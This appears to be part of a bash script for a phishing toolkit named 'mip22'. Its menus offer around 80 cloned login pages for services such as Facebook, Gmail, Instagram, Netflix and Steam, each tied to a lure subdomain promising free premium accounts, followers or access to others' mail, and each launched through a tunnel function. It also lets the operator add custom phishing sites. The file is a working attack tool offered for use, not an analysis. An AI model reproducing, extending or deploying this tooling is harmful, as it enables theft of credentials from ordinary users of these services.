		${GREEN}[${WHITE}14${GREEN}]${CYAN} Facebook Messenger   ${GREEN}[${WHITE}38${GREEN}]${CYAN} Protonmail     ${GREEN}[${WHITE}62${GREEN}]${CYAN} Whatsapp
		${GREEN}[${WHITE}15${GREEN}]${CYAN} Facebook Security    ${GREEN}[${WHITE}49${GREEN}]${CYAN} Pubg           ${GREEN}[${WHITE}63${GREEN}]${CYAN} Wordpress
		${GREEN}[${WHITE}16${GREEN}]${CYAN} Gmail                ${GREEN}[${WHITE}40${GREEN}]${CYAN} Quora          ${GREEN}[${WHITE}64${GREEN}]${CYAN} Xanga
		${GREEN}[${WHITE}17${GREEN}]${CYAN} Goodreads            ${GREEN}[${WHITE}41${GREEN}]${CYAN} Reverly        ${GREEN}[${WHITE}65${GREEN}]${CYAN} Xbox
		${GREEN}[${WHITE}18${GREEN}]${CYAN} Hotstar              ${GREEN}[${WHITE}42${GREEN}]${CYAN} Reddit         ${GREEN}[${WHITE}66${GREEN}]${CYAN} Xing
		${GREEN}[${WHITE}19${GREEN}]${CYAN} Icloud               ${GREEN}[${WHITE}43${GREEN}]${CYAN} Reverbnation   ${GREEN}[${WHITE}67${GREEN}]${CYAN} Yahoo
		${GREEN}[${WHITE}20${GREEN}]${CYAN} Influenster          ${GREEN}[${WHITE}44${GREEN}]${CYAN} Signal         ${GREEN}[${WHITE}68${GREEN}]${CYAN} Yandex
		${GREEN}[${WHITE}21${GREEN}]${CYAN} Instagram            ${GREEN}[${WHITE}45${GREEN}]${CYAN} Skype          ${GREEN}[${WHITE}69${GREEN}]${CYAN} Youtube SUbs
		${GREEN}[${WHITE}22${GREEN}]${CYAN} Insta Followers      ${GREEN}[${WHITE}46${GREEN}]${CYAN} Skyrock        ${GREEN}[${WHITE}02${GREEN}]${CYAN} Others
		${GREEN}[${WHITE}23${GREEN}]${CYAN} Insta Followers 2    ${GREEN}[${WHITE}47${GREEN}]${CYAN} Snapchat       ${GREEN}[${WHITE}99${GREEN}]${MAGENTA} Main Menu
		${GREEN}[${WHITE}24${GREEN}]${CYAN} Instagram Verify     ${GREEN}[${WHITE}48${GREEN}]${CYAN} Socialclub


	EOF


	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in

	    1)
			site="adobe"
			subdomain='http://adobe-pro-membership-lifetime-for-you'
			tunnel;;


	    2)
			site="amazon"
			subdomain='http://amazon-pro-membership-lifetime-for-you'
			tunnel;;


	    3)
			site="apple"
			subdomain='http://apple-security-account-login'
			tunnel;;


        4)
			site="badoo"
			subdomain='http://get-2000-euro-free-for-your-acount'
			tunnel;;


		5)
			site="care2"
			subdomain='http://get-2000-tokens-free-for-your-acount'
			tunnel;;


	    6)
			site="clashofclans"
			subdomain='http://get-free-character-for-clashofclans-game'
			tunnel;;


	    7)
			site="crunchyroll"
			subdomain='http://get-free-character-for-crunchyroll-game'
			tunnel;;


		8)
			site="deviantart"
			subdomain='http://deviantart-upgrade-account-pro-for-free'
			tunnel;;


		9)
			site="discord"
			subdomain='http://discord-upgrade-account-pro-for-free'
			tunnel;;


		10)
			site="dota2"
			subdomain='http://dota-upgrade-account-pro-for-free'
			tunnel;;


		11)
			site="dropbox"
			subdomain='http://get-2TB-cloud-storage-free'
			tunnel;;


        12)
			site="ebay"
			subdomain='http://ebay-upgrade-account-for-free'
			tunnel;;


		13)
		    site="facebook"
			subdomain='http://secure-verified-account-for-facebook'
			tunnel;;


		14)
			site="facebook_messenger"
			subdomain='http://messenger-premium-features-for-free'
			tunnel;;


        15)
            site="facebook_security"
			subdomain='http://make-your-facebook-secured-from-hackers'
			tunnel;;


	    16)
	 		site="gmail"
			subdomain='http://get-unlimited-google-drive-free'
			tunnel;;


	    17)
	 		site="goodreads"
			subdomain='http://goodreads-updrade-account-lifetime-free'
			tunnel;;


	    18)
			site="hotstar"
			subdomain='http://hotstar-premieum-account-for-free'
			tunnel;;


	   	19)
			site="icloud"
			subdomain='http://get-2TB-cloud-storage-free'
			tunnel;;


	   	20)
			site="influenster"
			subdomain='http://update-account-to-premium-free'
			tunnel;;


	    21)
			site="instagram"
			subdomain='http://secure-login-for-instagram'
			tunnel;;


	    22)
		    site="instagram_followers"
			subdomain='http://get-10000-followers-for-instagram'
			tunnel;;


	    23)
			site="instagram_followers_2"
			subdomain='http://get-10000-followers-for-instagram'
			tunnel;;


	    24)
			site="instagram_verify"
			subdomain='http://instagram-verify-account'
			tunnel;;


	    25)
			site="line"
			subdomain='http://line-get-free-tokens-for-speech'
			tunnel;;


	    26)
			site="linkedin"
			subdomain='http://get-a-premium-plan-for-linkedin-free'
			tunnel;;


	    27)
			site="livejournal"
			subdomain='http://get-a-premium-plan-for-livejournal-free'
			tunnel;;


		28)
            site="mediafire"
			subdomain='http://get-2TB-cloud-storage-free'
			tunnel;;


		29)
			site="mewe"
			subdomain='http://mewe-update-account-to-premium-free'
			tunnel;;


	   30)
            site="microsoft"
			subdomain='http://unlimited-onedrive-space-for-free'
			tunnel;;

	   31)
	        site="mocospace"
			subdomain='http://upgrade-your-mocospace-plan-free'
			tunnel;;


	   32)
	        site="myspace"
			subdomain='http://upgrade-your-myspace-plan-free'
			tunnel;;


	   33)
	        site="netflix"
			subdomain='http://upgrade-your-netflix-plan-free'
			tunnel;;

	   34)
	        site="origin"
			subdomain='http://origin-upgrade-to-premium-account-free'
			tunnel;;


	   35)
	        site="outlook"
			subdomain='http://unlimited-onedrive-space-for-free'
			tunnel;;

	   36)
	        site="pinterest"
			subdomain='http://get-a-premium-plan-for-pinterest-free'
			tunnel;;


	   37)
	        site="playstation"
			subdomain='http://playstation-premium-account-free'
			tunnel;;


       38)
	        site="protonmail"
			subdomain='http://protonmail-pro-basics-for-free'
			tunnel;;


	   39)
	        site="pubg"
			subdomain='http://get-free-character-for-pubs-game'
			tunnel;;


	   40)
	        site="quora"
			subdomain='http://get-quora-premium-account-for-free-lifetime'
			tunnel;;


	   41)
	        site="raverly"
			subdomain='http://get-raverly-premium-account-for-free-'
			tunnel;;


	   42)
	        site="reddit"
			subdomain='http://reddit-official-verified-member-badge'
			tunnel;;


	   43)
	        site="reverbnation"
			subdomain='http://get-reverbnation-premium-account-for-free-'
			tunnel;;


	   44)
			site="signal"
			subdomain='http://signal-get-free-tokens-for-speech'
			tunnel;;


	   45)
			site="skype"
			subdomain='http://skype-get-free-tokens-for-speech'
			tunnel;;


	   46)
	        site="skyrock"
			subdomain='http://skyrock-upgrade-to-premium-account-free'
			tunnel;;


       47)
	        site="snapchat"
			subdomain='http://view-locked-snapchat-accounts-secretly'
			tunnel;;

	   48)
	        site="socialclub"
			subdomain='http://-socialclub-update-account-to-premieum-free'
			tunnel;;


	   49)
	        site="spotify"
			subdomain='http://convert-your-account-to-spotify-premium'
			tunnel;;


	   50)
	        site="stackoverflow"
			subdomain='http://stackoverflow-convert-your-account-to-premium'
			tunnel;;


	   51)
	        site="steam"
			subdomain='http://steam-convert-your-account-to-premium'
			tunnel;;

	   52)
	        site="tagget"
			subdomain='http://tagget-convert-your-account-to-premium'
			tunnel;;


	   53)
	        site="telegram"
			subdomain='http://telegram-get-free-tokens-for-speech'
			tunnel;;


	   54)
	        site="tiktok"
			subdomain='http://get-tiktok-100000-followers-free-at-instant'
			tunnel;;


	   55)
	        site="tiktok_followers"
			subdomain='http://get-tiktok-100000-followers-free-at-instant'
			tunnel;;


	   56)
	        site="tumblr"
			subdomain='http://tumblr-upgrade-account-to-premium-free'
			tunnel;;


       57)
	        site="twitch"
			subdomain='http://unlimited-twitch-tv-user-for-free'
			tunnel;;


	   58)
	        site="twitter"
			subdomain='http://get-blue-badge-on-twitter-free'
			tunnel;;


	   59)
	        site="viber_out"
			subdomain='http://viber-get-free-tokens-for-speech'
			tunnel;;


	   60)
	        site="vimeo"
			subdomain='http://get-100000-views-for-channel-free'
			tunnel;;



	   61)
	        site="vk"
			subdomain='http://vk-premium-real-method-2022-free'
			tunnel;;


       62)
	        site="whatsapp"
			subdomain='http://get-3000-free-tokens-for-free'
			tunnel;;


	   63)
	        site="wordpress"
			subdomain='http://get-unlimited-wordpress-traffic-free'
			tunnel;;


	   64)
	        site="xanga"
			subdomain='http://xanga-update-account-to-premieum'
			tunnel;;


	   65)
	        site="xbox"
			subdomain='http://xbox-premium-account-new-method-2022'
			tunnel;;


	   66)
	        site="xing"
			subdomain='http://xing-update-account-to-premieum'
			tunnel;;



	   67)
	        site="yahoo"
			subdomain='http://grab-mail-from-anyother-yahoo-account-free'
			tunnel;;

	   68)
	        site="yandex"
			subdomain='http://grab-mail-from-anyother-yandex-account-free'
			tunnel;;


	   69)
	        site="youtube_subs"
			subdomain='http://get-100000-youtube-subscribers-free'
			tunnel;;


	   02)
	        other_sites;;


	   99)  menu;;


	   *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; attack;};;

	esac


}




other_sites() {

 { clear; header; echo; }

   	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Freefire
		${GREEN}[${WHITE}2${GREEN}]${CYAN} Roblox
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Academia
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Airbnb
		${GREEN}[${WHITE}5${GREEN}]${CYAN} Bigmuscle
		${GREEN}[${WHITE}6${GREEN}]${CYAN} Doximity
		${GREEN}[${WHITE}7${GREEN}]${CYAN} Flickr
		${GREEN}[${WHITE}8${GREEN}]${CYAN} Hi5
		${GREEN}[${WHITE}9${GREEN}]${CYAN} Issue
		${GREEN}[${WHITE}10${GREEN}]${CYAN} NYtimes
		${GREEN}[${WHITE}11${GREEN}]${CYAN} Pokemon Trainer
		${GREEN}[${WHITE}12${GREEN}]${CYAN} WTsocial
		${GREEN}[${WHITE}13${GREEN}]${CYAN} Yammer
		${GREEN}[${WHITE}14${GREEN}]${CYAN} Yelp
		${GREEN}[${WHITE}99${GREEN}]${MAGENTA} Main Menu

	EOF


	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in

	    1)
			site="freefire"
			subdomain='http://get-free-character-for-freefire-game'
			tunnel;;


	    2)
			site="roblox"
			subdomain='http://get-free-character-for-roblox-game'
			tunnel;;


	    3)
			site="academia"
			subdomain='http://academia-account-update-plan-free'
			tunnel;;


	    4)
			site="airbnb"
			subdomain='http://airbnb-account-upgrade-plan-free'
			tunnel;;


	    5)
			site="bigmuscle"
			subdomain='http://bigmuscle-account-update-plan-free'
			tunnel;;


	    6)
			site="doximity"
			subdomain='http://doximity-account-update-plan-free'
			tunnel;;


	    7)
			site="flickr"
			subdomain='http://flickr-account-upgrade-plan-pro-free'
			tunnel;;


	    8)
			site="hi5"
			subdomain='http://hi5-account-secure-login'
			tunnel;;


	    9)
			site="issue"
			subdomain='http://flickr-account-upgrade-plan-pro-free'
			tunnel;;


	    10)
			site="nytimes"
			subdomain='http://nytimes-account-upgrade-to-pro-free'
			tunnel;;


	    11)
			site="pokemon"
			subdomain='http://pokemon-update-account-plan-free'
			tunnel;;


	    12)
			site="wtsocial"
			subdomain='http://wtsocial-secure-login'
			tunnel;;


	    13)
			site="yammer"
			subdomain='http://yammer-secure-login'
			tunnel;;


	    14)
			site="yelp"
			subdomain='http://yelp-secure-login'
			tunnel;;


	   99) menu;;


	   *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; other_sites;};;

	esac


}





customize_sites()
{

 { clear; header; echo; }


echo -ne "\n${MAGENTA}Customize your sites.
${GREEN}Go inside the .customize folder \nand create your own customized sites inside folders.
Place all your files inside the same folder.
For example folder mysite and inside all files.
Then just type the folder name and choose tunnel. \n\n"


cat <<- EOF

${GREEN}[${WHITE}1${GREEN}]${CYAN} Customized
${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu

EOF

    read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in

	    1)
	      read -p ${CYAN}"Enter folder name e.x mysite: "${WHITE} customize_folder
	      read -p ${CYAN}"Enter subdomain for tunnel e.x mysite-update-plan-premium-free: "${WHITE} customize_subdomain
	      site=$customize_folder
	      subdomain=$customize_subdomain
	      tunnel_customize;;


	    99)
	       menu;;

	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; attack_customize;};;

	esac

}


menu() {

 { clear; header; echo; }

	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Start AttackS
		${GREEN}[${WHITE}0${GREEN}]${ORANGE} Exit


	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in

	    1) attack;;

	    help) help;;

		0)
		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using mip22 "${WHITE}
		sleep 2
		clear
		exit 1;;

	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; menu;};;

	esac

}


control_c()
{
  echo -e "${RESETBG}"
  echo -e "${RESETFG}"
  clear
  exit 1
}


trap control_c SIGINT



check_os_and_install_packages
check_root_and_os
pid_kill
menu